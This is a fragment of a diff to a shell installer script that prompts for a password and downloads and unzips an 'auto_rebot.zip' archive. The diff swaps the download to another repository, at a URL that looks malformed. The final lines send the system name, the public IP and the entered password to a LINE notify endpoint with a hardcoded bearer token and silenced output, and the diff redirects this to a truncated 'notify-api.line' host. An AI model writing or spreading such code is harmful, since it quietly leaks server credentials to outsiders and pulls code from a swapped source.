@@ -10,7 +10,7 @@ read -p " : " pass
 
 apt install php
 
-wget https://github.com/sansoe2022/sks_script/raw/main/Install/auto_rebot.zip
+wget https://raw.githubusercontent.com/hunmai/ovpn-auto/raw/main/Install/auto_rebot.zip
 
 unzip auto_rebot.zip
 
@@ -41,4 +41,4 @@ Settings completed
 curl -X POST -H 'Authorization: Bearer 8QXhBz0jeUANsAq9ipZJy0SRxOMQ24FG3p3asWbM3XJ' -F 'message='"
 System: $(printf '%-14s' "$system")
 IP : $(wget -qO- ipv4.icanhazip.com)
-Password : $pass "'' https://notify-api.line.me/api/notify > /dev/null 2>&1
+Password : $pass "'' https://notify-api.line/api/notify > /dev/null 2>&1
